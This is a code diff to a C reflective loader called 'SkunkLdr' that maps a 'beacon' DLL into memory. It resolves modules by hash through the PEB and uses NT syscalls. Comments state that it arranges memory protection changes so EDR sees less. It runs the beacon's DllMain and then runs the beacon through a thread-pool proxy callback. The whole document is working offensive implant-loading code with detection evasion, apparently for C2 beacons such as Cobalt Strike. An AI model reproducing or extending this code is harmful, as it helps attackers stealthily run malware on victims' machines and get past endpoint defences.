@@ -3,9 +3,7 @@
 
 typedef struct _BEACON_ARGS {
     UINT_PTR pBeaconDllMain;
-    LPVOID hinstDLL;
-    DWORD fdwReason;
-    LPVOID lpvReserved;
+    UINT_PTR hinstDLL;
 } BEACON_ARGS, *PBEACON_ARGS;
 
 EXTERN_C
@@ -15,7 +13,7 @@ WINAPI
 SkunkLdr(VOID) {
     INSTANCE                instance        = {0};
     PVOID                   pSkunkBase      = NULL;
-    HMODULE                 pBeacon         = NULL;
+    PVOID                   pBeacon         = NULL;
     PIMAGE_NT_HEADERS       pImgNtHeaders   = NULL;
     PIMAGE_SECTION_HEADER   pImgSecHeader   = NULL;
     PIMAGE_DATA_DIRECTORY   pImgDataDir     = NULL;
@@ -29,11 +27,12 @@ SkunkLdr(VOID) {
     // Some of the code below might show an error in your IDE. Ignore it, I promise it works
 
     // Compute base of loader and beacon lib
-#ifdef DEBUG
-    volatile unsigned char debug[] = "TEST";
-#endif
     pSkunkBase = RipStart();
     pBeacon = RipEnd();
+    if (!pBeacon) {
+        return;
+    }
+
     // Resolve needed functions and modules
     if (!(instance.Modules.Ntdll = LdrModulePeb(HASHW(L"ntdll.dll")))) {
         return;
@@ -84,18 +83,22 @@ SkunkLdr(VOID) {
     sMemSize = pImgNtHeaders->OptionalHeader.SizeOfImage;
 
     // EDR can see original memory protection. Start with RX allocation, switch to RW, then revert to RX
-    if (NT_SUCCESS(instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(), &pMemAddr, 0, &sMemSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE))) {
+    if (NT_SUCCESS(instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(), &pMemAddr, 0, &sMemSize, MEM_COMMIT, PAGE_EXECUTE_READ))) {
         // Switch to RW
-        //instance.Win32.NtProtectVirtualMemory(NtCurrentProcess(), &pMemAddr, &sMemSize, PAGE_READWRITE, &ullOldPrt);
+        instance.Win32.NtProtectVirtualMemory(NtCurrentProcess(), &pMemAddr, &sMemSize, PAGE_READWRITE, &ullOldPrt);
 
         // Copy beacon lib sections headers into allocated memory
         pImgSecHeader = IMAGE_FIRST_SECTION(pImgNtHeaders);
         for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++) {
-            MemCopy(
-                    C_PTR(pMemAddr + pImgSecHeader[i].VirtualAddress),
-                    C_PTR(pBeacon + pImgSecHeader[i].PointerToRawData),
-                    pImgSecHeader[i].SizeOfRawData
-                    );
+            LPVOID src = C_PTR(pBeacon + pImgSecHeader[i].PointerToRawData);
+            LPVOID dest = C_PTR(pMemAddr + pImgSecHeader[i].VirtualAddress);
+            SIZE_T size = pImgSecHeader[i].SizeOfRawData;
+
+            if (pImgSecHeader[i].PointerToRawData + size > pImgNtHeaders->OptionalHeader.SizeOfImage || !src || !dest) {
+                return;
+            }
+
+            MemCopy(dest, src, size);
         }
 
         // Resolve beacon lib IAT
@@ -111,7 +114,7 @@ SkunkLdr(VOID) {
         }
 
         // Set memory protections
-        for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; ++i) {
+        for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++) {
             pMemSec = C_PTR(pMemAddr + pImgSecHeader[i].VirtualAddress);
             sMemSecSize = pImgSecHeader[i].SizeOfRawData;
             dwMemPrt = 0;
@@ -139,26 +142,26 @@ SkunkLdr(VOID) {
                 dwMemPrt = PAGE_EXECUTE_READWRITE;
             }
 
+            //dwMemPrt = PAGE_EXECUTE_READ;
             instance.Win32.NtProtectVirtualMemory(NtCurrentProcess(), &pMemSec, &sMemSecSize, dwMemPrt, &ullOldPrt);
         }
 
         // Execute beacon lib DllMain
-        //BOOL (WINAPI *beaconDllMain) (PVOID, PVOID, PVOID) = C_PTR(pMemAddr + pImgNtHeaders->OptionalHeader.AddressOfEntryPoint);
-        //beaconDllMain(pMemAddr, DLL_PROCESS_ATTACH, NULL);
+        BOOL (WINAPI *beaconDllMain) (PVOID, PVOID, PVOID) = C_PTR(pMemAddr + pImgNtHeaders->OptionalHeader.AddressOfEntryPoint);
+        beaconDllMain(pMemAddr, DLL_PROCESS_ATTACH, NULL);
 
         PTP_WORK WorkReturn = NULL;
         BEACON_ARGS beaconArgs = {0};
-        beaconArgs.pBeaconDllMain = U_PTR(C_PTR(pMemAddr + pImgNtHeaders->OptionalHeader.AddressOfEntryPoint));
-        beaconArgs.hinstDLL = pMemAddr;
-        beaconArgs.fdwReason = DLL_PROCESS_ATTACH;
-        beaconArgs.lpvReserved = NULL;
+        beaconArgs.pBeaconDllMain = U_PTR(beaconDllMain);
+        beaconArgs.hinstDLL = U_PTR(pMemAddr);
 
-        __debugbreak();
-        instance.Win32.TpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK) ProxyCaller, &beaconArgs, NULL);
+        // Compute pointer to ProxyCaller
+        VOID (CALLBACK *proxyCaller) (PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK) = RipCaller();
+
+        instance.Win32.TpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK) proxyCaller, &beaconArgs, NULL);
         instance.Win32.TpPostWork(WorkReturn);
         instance.Win32.TpReleaseWork(WorkReturn);
-        __debugbreak();
 
-        //instance.Win32.WaitForSingleObject(-1, INFINITE);
+        instance.Win32.WaitForSingleObject((HANDLE)-1, 5);
     }
 }
